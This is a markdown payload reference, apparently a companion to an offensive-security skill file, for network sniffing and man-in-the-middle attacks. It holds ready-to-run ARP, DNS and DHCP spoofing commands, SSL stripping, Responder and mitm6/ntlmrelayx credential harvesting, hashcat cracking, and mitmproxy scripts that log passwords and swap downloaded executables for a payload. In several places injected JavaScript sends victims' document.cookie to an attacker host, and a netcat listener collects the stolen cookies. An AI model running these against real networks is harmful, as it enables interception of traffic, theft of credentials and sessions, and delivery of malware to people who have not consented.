# Payloads: Network Sniffing and MITM

> This file is a companion to `SKILL.md`, containing attack payloads and command references for network traffic interception, MITM positioning, credential harvesting, and traffic manipulation.

---

## 1. Network Survey and Topology Mapping

### ARP Scanning

```bash
# Quick scan of the local network segment
arp-scan -l

# Specify interface and subnet
arp-scan -i eth0 192.168.1.0/24

# Verbose mode with vendor OUI lookup
arp-scan -v 192.168.1.0/24

# Scan multiple VLANs
arp-scan -i eth0 10.0.1.0/24 10.0.2.0/24 10.0.3.0/24
```

### Passive Host Discovery

```bash
# Passive observation with tcpdump — listen without sending any packets
tcpdump -i eth0 -n -l | awk '{print $3}' | sort -u

# Monitor ARP traffic to discover hosts
tcpdump -i eth0 -n -l arp | awk '{print $NF}'

# bettercap passive probe
bettercap -iface eth0
> net.probe on
> net.show
```

### Gateway and DNS Identification

```bash
# Identify default gateway
ip route show default

# Identify DNS servers
cat /etc/resolv.conf

# Identify all network interfaces and IPs
ip addr show

# Check for IPv6 addresses and routes
ip -6 addr show
ip -6 route show
```

---

## 2. Passive Packet Capture

### tcpdump Capture with BPF Filters

```bash
# Capture all traffic on interface to file
tcpdump -i eth0 -w capture.pcap

# Capture specific host traffic
tcpdump -i eth0 host 192.168.1.100 -w target_traffic.pcap

# Capture only HTTP traffic
tcpdump -i eth0 port 80 -w http_traffic.pcap

# Capture HTTP and HTTPS traffic
tcpdump -i eth0 port 80 or port 443 -w web_traffic.pcap

# Capture with hex + ASCII display for protocol inspection
tcpdump -i eth0 -X -vvv port 21

# Capture only SYN packets (connection establishment)
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -w syn_packets.pcap

# Capture DNS queries
tcpdump -i eth0 -n port 53 -w dns_queries.pcap

# Capture FTP credentials (port 21)
tcpdump -i eth0 -A port 21 -w ftp_creds.pcap

# Capture SMTP/IMAP/POP3 traffic
tcpdump -i eth0 port 25 or port 110 or port 143 -w mail_traffic.pcap

# Ring buffer capture — rotate files every 60 seconds, keep 24 files
tcpdump -i eth0 -w capture_%Y%m%d_%H%M%S.pcap -G 60 -W 24

# Limit capture size (1000 packets)
tcpdump -i eth0 -c 1000 -w limited_capture.pcap

# Filter by network segment
tcpdump -i eth0 net 192.168.1.0/24 -w subnet_traffic.pcap

# Capture with full packet payload (snaplen 0 = full)
tcpdump -i eth0 -s 0 -w full_packets.pcap
```

### tshark Protocol-Aware Capture

```bash
# Live capture with display filter
tshark -i eth0 -Y "http.request" -l

# Capture filter (BPF syntax, applied at kernel level)
tshark -i eth0 -f "port 80 or port 443" -w filtered_capture.pcap

# Extract HTTP credentials in real-time
tshark -i eth0 -Y "http.authorization || http.cookie" \
  -T fields -e ip.src -e http.authorization -e http.cookie -l

# Extract FTP credentials
tshark -i eth0 -Y "ftp.request.command == USER || ftp.request.command == PASS" \
  -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

# Monitor DNS queries in real-time
tshark -i eth0 -Y "dns.qr == 0" -T fields -e ip.src -e dns.qry.name -l
```

---

## 3. ARP Spoofing and MITM Positioning

### Bettercap ARP Spoofing

```bash
# Start bettercap on target interface
bettercap -iface eth0

# Network discovery
> net.probe on
> net.show

# Enable IP forwarding (bettercap does this automatically, but verify)
> sys.core.iface.forwarding true

# Spoof all hosts on the subnet
> set arp.spoof.internal true
> arp.spoof on

# Target a specific host
> set arp.spoof.targets 192.168.1.100
> arp.spoof on

# Target multiple hosts
> set arp.spoof.targets 192.168.1.100,192.168.1.101,192.168.1.102
> arp.spoof on

# One-liner: start bettercap with ARP spoofing directly
bettercap -iface eth0 -eval "net.probe on; set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"

# Enable credential sniffing during MITM
> net.sniff on
> net.sniff.output /tmp/mitm_sniff.log

# Stop spoofing and cleanup
> arp.spoof off
```

### Ettercap ARP Spoofing

```bash
# Text mode, ARP spoof target <-> gateway
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Spoof entire subnet
ettercap -T -q -i eth0 -M arp:remote /// ///

# GUI mode for interactive analysis
ettercap -G

# With specific packet filtering
ettercap -T -q -i eth0 -M arp:remote /target// /gateway// -f filter.ef

# Compile ettercap filter from source
etterfilter filter.ecf -o filter.ef
```

### dsniff arpspoof (Lightweight)

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison target -> gateway
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Poison gateway -> target (run in separate terminal for bidirectional)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# One-liner bidirectional (background both)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 & arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &
```

---

## 4. Credential Harvesting

### Responder — LLMNR/NBT-NS/mDNS Poisoning

```bash
# Start Responder with all protocols (default mode)
responder -I eth0

# Enable WPAD, DHCP, and force authentication
responder -I eth0 -w -d -f

# Analyze mode only — listen without poisoning (reconnaissance)
responder -I eth0 -A

# Start with custom responder config
responder -I eth0 -c /path/to/Responder.conf

# Disable specific protocols
# Edit /usr/share/responder/Responder.conf:
#   HTTP = Off
#   SMB = Off
#   FTP = Off
responder -I eth0

# View captured hashes
cat /usr/share/responder/logs/*.txt

# Responder with specific challenge (for NTLMv1 downgrade)
responder -I eth0 --lm
```

### dsniff Credential Sniffing Suite

```bash
# Sniff URLs from HTTP traffic
urlsnarf -i eth0

# Sniff files transferred via NFS
filesnarf -i eth0

# Sniff email content (SMTP/POP3/IMAP)
mailsnarf -i eth0

# Sniff passwords from cleartext protocols (FTP/HTTP/SMTP/POP3/IMAP/Telnet)
dsniff -i eth0

# Capture MSN Messenger chat (legacy, but useful for older environments)
msgsnarf -i eth0

# Extract images from HTTP traffic
driftnet -i eth0 -d /tmp/driftnet_images
```

### Bettercap Credential Sniffing

```bash
# Start network sniffer module
bettercap -iface eth0
> net.sniff on

# Sniff with output to file
> set net.sniff.output /tmp/credentials.log
> net.sniff on

# Sniff specific protocols only
> set net.sniff.filter "port 80 or port 21 or port 25"
> net.sniff on

# HTTP credential extraction
> set net.sniff.local true
> net.sniff on

# Capture all traffic with verbose logging
> set net.sniff.verbose true
> net.sniff on
```

### tshark Credential Extraction from PCAP

```bash
# Extract HTTP Basic Auth credentials
tshark -r capture.pcap -Y "http.authorization" \
  -T fields -e ip.src -e http.authorization

# Extract HTTP POST form data (usernames/passwords)
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.request.uri -e http.file_data

# Extract HTTP cookies
tshark -r capture.pcap -Y "http.cookie" \
  -T fields -e ip.src -e http.host -e http.cookie

# Extract FTP credentials
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" \
  -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

# Extract SMTP AUTH credentials
tshark -r capture.pcap -Y "smtp.auth" \
  -T fields -e ip.src -e smtp.auth.username -e smtp.auth.password

# Extract Kerberos AS-REQ (pre-authentication hashes for AS-REP Roasting)
tshark -r capture.pcap -Y "kerberos.msg_type == 10" \
  -T fields -e ip.src -e kerberos cname

# Extract all NTLM SSP authentication
tshark -r capture.pcap -Y "ntlmssp" \
  -T fields -e ip.src -e ip.dst -e ntlmssp.auth.username
```

---

## 5. DNS Spoofing

### Bettercap DNS Spoofing

```bash
bettercap -iface eth0
> set dns.spoof.domains example.com,mail.example.com,intranet.local
> set dns.spoof.address 192.168.1.50
> dns.spoof on

# Spoof all subdomains of a domain
> set dns.spoof.domains *.example.com
> set dns.spoof.address 192.168.1.50
> dns.spoof on

# Spoof multiple domains to different IPs (use caplet)
# Create file dns-spoof.cap:
#   set dns.spoof.domains example.com
#   set dns.spoof.address 10.0.0.1
#   dns.spoof on
> cap dns-spoof.cap
```

### dnsspoof (dsniff suite)

```bash
# Create spoofing rules file
cat > dns_spoof.txt << 'EOF'
192.168.1.50   example.com
192.168.1.50   mail.example.com
192.168.1.50   intranet.local
EOF

# Start DNS spoofing
dnsspoof -i eth0 -f dns_spoof.txt

# Spoof all domains (wildcard — aggressive, easily detected)
echo "192.168.1.50   *" > dns_spoof_all.txt
dnsspoof -i eth0 -f dns_spoof_all.txt
```

### Ettercap DNS Spoofing

```bash
# Edit etter.dns file
cat >> /etc/ettercap/etter.dns << 'EOF'
example.com       A   192.168.1.50
*.example.com     A   192.168.1.50
intranet.local    A   192.168.1.50
EOF

# Start ettercap with DNS spoofing plugin
ettercap -T -q -i eth0 -M arp:remote /target// /gateway// -P dns_spoof
```

---

## 6. SSL/TLS Stripping and HTTPS Downgrade

### Bettercap SSL Stripping

```bash
bettercap -iface eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on

# Enable HTTP proxy with SSL stripping
> http.proxy on
> set http.proxy.sslstrip true
> net.sniff on

# Inject JavaScript into HTTP responses
> set http.proxy.injectjs "alert('MITM proof: Your traffic is being intercepted')"
> http.proxy on
```

### sslstrip (Standalone)

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTP traffic to sslstrip listener
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Start ARP spoofing (in separate terminal)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Start sslstrip
sslstrip -l 8080 -w sslstrip.log

# Cleanup after testing
iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
killall arpspoof
```

### mitmproxy Transparent Mode

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTP to mitmproxy
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Redirect HTTPS to mitmproxy (requires certificate installation on victim)
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# Start mitmproxy in transparent mode
mitmproxy --mode transparent -p 8080

# Alternative: web interface mode
mitmweb --mode transparent -p 8080

# Cleanup
iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
```

---

## 7. IPv6 MITM with mitm6

### Basic mitm6 Attack

```bash
# Start mitm6 targeting a specific domain
mitm6 -d domain.local -i eth0

# Target specific hosts
mitm6 -d domain.local -i eth0 --target 192.168.1.100

# Ignore certain hosts (e.g., domain controllers)
mitm6 -d domain.local -i eth0 --ignore 192.168.1.1

# Debug mode for troubleshooting
mitm6 -d domain.local -i eth0 --debug
```

### mitm6 Chained with NTLM Relay

```bash
# Terminal 1: Start mitm6
mitm6 -d domain.local -i eth0

# Terminal 2: Start ntlmrelayx targeting LDAPS
ntlmrelayx.py -6 -t ldaps://dc01.domain.local --add-computer FAKEPC$ --delegate-access

# Terminal 3: Alternative relay target — SMB
ntlmrelayx.py -6 -t smb://192.168.1.50 -smb2support -c "whoami > C:\proof.txt"

# Terminal 4: Relay to LDAP for enumeration
ntlmrelayx.py -6 -t ldap://dc01.domain.local --no-dump --no-da --no-acl --no-validate-privs
```

---

## 8. Bettercap Caplet Scripting

### Caplet: Automated MITM with Credential Logging

```bash
# File: auto-mitm.cap
# Usage: bettercap -iface eth0 -caplet auto-mitm.cap

# Network discovery
net.probe on
sleep 5
net.show

# Set targets (modify before running)
set arp.spoof.targets 192.168.1.100

# Enable ARP spoofing
arp.spoof on

# Start credential sniffing with output
set net.sniff.output /tmp/mitm_captures.log
net.sniff on

# Enable HTTP proxy for SSL stripping
http.proxy on
set http.proxy.sslstrip true

# Log event
events.stream on
```

### Caplet: DNS Spoofing + Credential Harvest

```bash
# File: dns-harvest.cap
# Usage: bettercap -iface eth0 -caplet dns-harvest.cap

set arp.spoof.targets 192.168.1.100
arp.spoof on

set dns.spoof.domains intranet.company.local,mail.company.local
set dns.spoof.address 192.168.1.50
dns.spoof on

set net.sniff.output /tmp/dns_harvest.log
net.sniff on

http.proxy on
set http.proxy.injectjs "document.title='[INTERCEPTED] ' + document.title"
```

### Caplet: Full Traffic Interception

```bash
# File: full-intercept.cap
# Usage: bettercap -iface eth0 -caplet full-intercept.cap

# Discover all hosts
net.probe on
sleep 3

# ARP spoof all internal hosts
set arp.spoof.internal true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Capture everything
set net.sniff.output /tmp/full_capture.pcap
net.sniff on

# HTTP proxy with injection
http.proxy on
set http.proxy.injectjs "new Image().src='http://attacker/log?cookie='+document.cookie"

# HTTPS proxy
https.proxy on
```

---

## 9. mitmproxy Scripting for Traffic Manipulation

### Python Script: Log All Credentials

```python
# File: log_creds.py
# Usage: mitmproxy -s log_creds.py -p 8080 --mode transparent

from mitmproxy import http
import json
import time

CRED_LOG = "/tmp/mitmproxy_creds.jsonl"

def request(flow: http.HTTPFlow):
    """Log credentials from HTTP requests."""
    entry = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "client": flow.client_conn.address[0],
        "method": flow.request.method,
        "url": flow.request.pretty_url,
        "headers": dict(flow.request.headers),
    }

    # Log Authorization headers
    if "Authorization" in flow.request.headers:
        entry["auth"] = flow.request.headers["Authorization"]

    # Log POST form data that may contain passwords
    if flow.request.method == "POST" and flow.request.urlencoded_form:
        form = dict(flow.request.urlencoded_form)
        for field in ["password", "passwd", "pass", "pwd", "secret", "token"]:
            if field in form:
                entry["credentials"] = {field: form[field]}
                break

    # Log cookies
    if "Cookie" in flow.request.headers:
        entry["cookies"] = flow.request.headers["Cookie"]

    with open(CRED_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")

def response(flow: http.HTTPFlow):
    """Log interesting response headers."""
    if "Set-Cookie" in flow.response.headers:
        entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "client": flow.client_conn.address[0],
            "url": flow.request.pretty_url,
            "set_cookie": flow.response.headers["Set-Cookie"],
        }
        with open(CRED_LOG, "a") as f:
            f.write(json.dumps(entry) + "\n")
```

### Python Script: Replace File Downloads

```python
# File: replace_downloads.py
# Usage: mitmproxy -s replace_downloads.py -p 8080 --mode transparent

from mitmproxy import http

REPLACEMENT_FILE = "/path/to/replaced_file.exe"
TARGET_EXTENSIONS = [".exe", ".msi", ".zip", ".pdf"]

def response(flow: http.HTTPFlow):
    """Replace downloaded files with a custom payload."""
    url = flow.request.pretty_url
    if any(url.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
        if flow.response.status_code == 200:
            with open(REPLACEMENT_FILE, "rb") as f:
                flow.response.content = f.read()
            flow.response.headers["Content-Length"] = str(len(flow.response.content))
```

---

## 10. tshark PCAP Analysis Commands

### Protocol Hierarchy and Statistics

```bash
# Protocol hierarchy statistics (breakdown by protocol)
tshark -r capture.pcap -q -z io,phs

# Overall capture statistics
tshark -r capture.pcap -q -z conv,ip

# TCP conversation statistics
tshark -r capture.pcap -q -z conv,tcp

# DNS query statistics
tshark -r capture.pcap -q -z dns,tree

# HTTP request statistics
tshark -r capture.pcap -q -z http,tree

# Endpoint statistics (who talked to whom)
tshark -r capture.pcap -q -z endpoints,ip
```

### Credential and Sensitive Data Extraction

```bash
# Extract all HTTP Basic Auth credentials
tshark -r capture.pcap -Y "http.authorization" \
  -T fields -e ip.src -e ip.dst -e http.host -e http.authorization

# Extract cookies
tshark -r capture.pcap -Y "http.cookie" \
  -T fields -e ip.src -e http.host -e http.cookie

# Extract HTTP POST form data
tshark -r capture.pcap -Y "http.request.method == POST && urlencoded-form.key" \
  -T fields -e ip.src -e http.host -e http.request.uri \
  -e urlencoded-form.key -e urlencoded-form.value

# Extract all DNS query-response pairs
tshark -r capture.pcap -Y "dns.qr == 0" \
  -T fields -e ip.src -e dns.qry.name -e dns.qry.type

# Extract Kerberos tickets
tshark -r capture.pcap -Y "kerberos" \
  -T fields -e ip.src -e ip.dst -e kerberos.msg_type -e kerberos.cname

# Extract SMB session setup (NTLM auth)
tshark -r capture.pcap -Y "smb2.cmd == 1 && ntlmssp" \
  -T fields -e ip.src -e ip.dst -e ntlmssp.auth.username

# Export all HTTP objects (images, files, documents)
tshark -r capture.pcap --export-objects http,/tmp/http_exports

# Export all SMB objects
tshark -r capture.pcap --export-objects smb,/tmp/smb_exports

# Export all IMAP/POP3/SMTP objects (email attachments)
tshark -r capture.pcap --export-objects imf,/tmp/email_exports
```

### Filtering Techniques

```bash
# Filter by IP address
tshark -r capture.pcap -Y "ip.addr == 192.168.1.100"

# Filter by IP conversation
tshark -r capture.pcap -Y "ip.src == 192.168.1.100 && ip.dst == 10.0.0.1"

# Filter HTTP status codes
tshark -r capture.pcap -Y "http.response.code == 200"

# Filter by time range
tshark -r capture.pcap -Y "frame.time >= \"2025-06-01 09:00:00\" && frame.time <= \"2025-06-01 17:00:00\""

# Find unusually large HTTP responses (potential data exfiltration)
tshark -r capture.pcap -Y "http.response && http.content_length > 1000000" \
  -T fields -e ip.src -e ip.dst -e http.content_length -e http.request.uri

# Find TCP retransmissions (indicates network issues or injection)
tshark -r capture.pcap -Y "tcp.analysis.retransmission" \
  -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport
```

---

## 11. Hash Cracking (Post-Harvest)

### hashcat NTLM Hash Cracking

```bash
# Crack NetNTLMv2 hashes (captured by Responder)
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack NetNTLMv1 hashes
hashcat -m 5500 responder_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with rules for better coverage
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Session with restore capability
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt \
  --session ntlmv2_crack

# Resume interrupted session
hashcat --session ntlmv2_crack --restore

# Show cracked results
hashcat -m 5600 responder_hashes.txt --show
```

### John the Ripper Alternative

```bash
# Crack NetNTLMv2 hashes
john --format=netntlmv2 responder_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked results
john --format=netntlmv2 responder_hashes.txt --show
```

---

## 12. Rogue DHCP and DHCP Spoofing

### Bettercap DHCP Spoofing

```bash
bettercap -iface eth0
> set dhcp.spoof.address 192.168.1.50
> set dhcp.spoof.dns 192.168.1.50
> set dhcp.spoof.router 192.168.1.50
> dhcp.spoof on

# Combined: DHCP spoof + DNS spoof for transparent interception
> set dns.spoof.domains *
> set dns.spoof.address 192.168.1.50
> dns.spoof on
```

### Ettercap DHCP Spoofing

```bash
# Edit etter.conf to set DHCP spoofing parameters
# Start ettercap with DHCP spoofing plugin
ettercap -T -q -i eth0 -M dhcp:192.168.1.50,192.168.1.100-150/255.255.255.0/192.168.1.50
```

---

## 13. Image and File Exfiltration

### driftnet Image Capture

```bash
# Capture images from HTTP traffic to directory
driftnet -i eth0 -d /tmp/driftnet_images

# Capture with image display (X11)
driftnet -i eth0

# Capture adjacent to images only (no display)
driftnet -i eth0 -d /tmp/driftnet_images -s

# Run in background during MITM
driftnet -i eth0 -d /tmp/images &
```

### filesnarf NFS File Capture

```bash
# Capture files from NFS traffic
filesnarf -i eth0

# Save to specific directory
filesnarf -i eth0 -o /tmp/nfs_files
```

### tshark Object Extraction

```bash
# Extract all HTTP objects (images, PDFs, executables, etc.)
tshark -r capture.pcap --export-objects http,/tmp/http_objects

# Extract all DICOM medical images (medical network)
tshark -r capture.pcap --export-objects dicom,/tmp/dicom_objects

# List extracted files
ls -la /tmp/http_objects/
```

---

## 14. Session Hijacking

### Bettercap Session Hijacking

```bash
bettercap -iface eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on

# Monitor for session cookies
> net.sniff on

# Hijack HTTP session by injecting cookie
# Use http.proxy to inject cookies into requests
> http.proxy on
> set http.proxy.injectjs "fetch('/admin', {headers:{'Cookie':'session=hijacked_session_id'}})"
```

### Cookie Stealing via Injected JavaScript

```bash
# Bettercap: inject cookie-exfiltration JavaScript
bettercap -iface eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> http.proxy on
> set http.proxy.injectjs "new Image().src='http://192.168.1.50/steal?c='+document.cookie+';u='+document.location"

# Capture the exfiltrated cookies
# Terminal 2: listen with netcat
nc -lvp 80 -k | grep "steal?c=" >> /tmp/stolen_cookies.txt
```

---

## 15. Cleanup and Anti-Detection

### Restore Normal ARP Tables

```bash
# Stop all spoofing tools
killall arpspoof 2>/dev/null
killall ettercap 2>/dev/null

# In bettercap: disable spoofing
> arp.spoof off
> dns.spoof off

# Restore iptables rules
iptables -t nat -F
iptables -F

# Disable IP forwarding (if no longer needed)
echo 0 > /proc/sys/net/ipv4/ip_forward

# Verify ARP cache on target (if accessible)
arp -a
```

### Verify MITM Cleanup

```bash
# Check for stale ARP entries
arp -an | grep -i incomplete

# Verify no iptables redirects remain
iptables -t nat -L -n -v

# Ensure IP forwarding is off
cat /proc/sys/net/ipv4/ip_forward

# Check for running sniffing processes
ps aux | grep -E "tcpdump|tshark|bettercap|ettercap|responder|dsniff"
```
